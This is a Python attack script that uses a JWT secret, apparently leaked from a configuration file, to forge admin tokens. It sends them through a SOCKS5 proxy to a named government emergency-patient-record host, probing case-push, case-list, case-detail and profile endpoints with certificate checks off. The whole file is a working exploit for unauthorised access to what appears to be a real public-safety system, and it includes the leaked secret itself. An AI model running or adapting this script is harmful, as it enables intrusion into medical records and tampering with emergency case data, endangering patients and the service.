#!/usr/bin/env python3
"""
EPCR JWT Forge — use leaked JWT_PASSWORD to forge tokens
Then test against /case/push and Socket.IO
"""
import requests
import json
import time

# ─── SOCKS5 proxy ───
PROXY_HOST = "202.160.76.157"
PROXY_PORT = 11081
PROXIES = {
    "http": f"socks5://{PROXY_HOST}:{PROXY_PORT}",
    "https": f"socks5://{PROXY_HOST}:{PROXY_PORT}",
}

# ─── Leaked secrets from epcr_config.csv ───
JWT_SECRET = "ru/3xu4dkru4888"
EPCR_HOST = "epcr.tpf.gov.tw"

# ─── Forge JWT ───
# The EPCR config says JWT_PASSWORD, so jwt.sign(payload, JWT_SECRET)
# Need to figure out the payload structure
import jwt as pyjwt
import datetime

def forge_jwt(account="admin", role="ADMIN", user_id=1, expires_hours=48):
    """Forge a JWT using the leaked secret"""
    payload = {
        "sub": str(user_id),
        "account": account,
        "role": role,
        "iat": datetime.datetime.now(datetime.timezone.utc),
        "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=expires_hours),
    }
    token = pyjwt.encode(payload, JWT_SECRET, algorithm="HS256")
    return token

# Try different payload structures
print("=== Forging JWT with leaked secret ===\n")

# Attempt 1: Standard jwt structure (account as claim)
token1 = forge_jwt(account="admin", role="ADMIN", user_id=1)
print(f"Token 1 (sub=1, account=admin, role=ADMIN): {token1[:50]}...")

# Attempt 2: Account as sub
token2 = pyjwt.encode({
    "sub": "admin",
    "account": "admin",
    "role": "ADMIN",
    "iat": datetime.datetime.now(datetime.timezone.utc),
    "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=48),
}, JWT_SECRET, algorithm="HS256")
print(f"Token 2 (sub=admin): {token2[:50]}...")

# Attempt 3: Minimal payload
token3 = pyjwt.encode({
    "account": "admin",
    "role": "ADMIN",
}, JWT_SECRET, algorithm="HS256")
print(f"Token 3 (minimal): {token3[:50]}...")

# Attempt 4: userId instead of sub
token4 = pyjwt.encode({
    "userId": 1,
    "account": "admin",
    "role": "ADMIN",
    "iat": datetime.datetime.now(datetime.timezone.utc),
    "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=48),
}, JWT_SECRET, algorithm="HS256")
print(f"Token 4 (userId=1): {token4[:50]}...")

# Attempt 5: id instead of userId
token5 = pyjwt.encode({
    "id": 1,
    "account": "admin",
    "role": "ADMIN",
}, JWT_SECRET, algorithm="HS256")
print(f"Token 5 (id=1, no exp): {token5[:50]}...")

# Attempt 6: Just account
token6 = pyjwt.encode({"account": "admin"}, JWT_SECRET, algorithm="HS256")
print(f"Token 6 (just account): {token6[:50]}...")

# Now test all tokens against /case/push
print("\n=== Testing forged JWTs against /case/push ===\n")
push_url = f"https://{EPCR_HOST}:4004/case/push"

for i, token in enumerate([token1, token2, token3, token4, token5, token6], 1):
    try:
        resp = requests.post(
            push_url,
            params={"token": token},
            json={"caseId": "test", "message": "test"},
            proxies=PROXIES,
            verify=False,
            timeout=10,
        )
        body = resp.text[:200] if resp.text else "(empty)"
        print(f"Token {i}: HTTP {resp.status_code} — {body}")
    except Exception as e:
        print(f"Token {i}: Error — {e}")

# Also test via Authorization header
print("\n=== Testing via Authorization header ===\n")
for i, token in enumerate([token1, token2, token3, token4, token5, token6], 1):
    try:
        resp = requests.post(
            push_url,
            headers={"Authorization": f"Bearer {token}"},
            json={"caseId": "test", "message": "test"},
            proxies=PROXIES,
            verify=False,
            timeout=10,
        )
        body = resp.text[:200] if resp.text else "(empty)"
        print(f"Token {i} (Bearer header): HTTP {resp.status_code} — {body}")
    except Exception as e:
        print(f"Token {i} (Bearer): Error — {e}")

# Test against /config endpoint with JWT (maybe it has auth'd endpoints)
print("\n=== Testing JWT on known EPCR HTTP endpoints ===\n")
for endpoint in ["/case/push", "/case/list", "/case/detail", "/auth/profile"]:
    for i, token in enumerate([token1, token2, token5], 1):
        try:
            resp = requests.get(
                f"https://{EPCR_HOST}:4004{endpoint}",
                params={"token": token},
                proxies=PROXIES,
                verify=False,
                timeout=10,
            )
            body = resp.text[:100] if resp.text else "(empty)"
            print(f"GET {endpoint} token{i}: HTTP {resp.status_code} — {body}")
        except Exception as e:
            print(f"GET {endpoint} token{i}: Error — {e}")

print("\n=== Done ===")
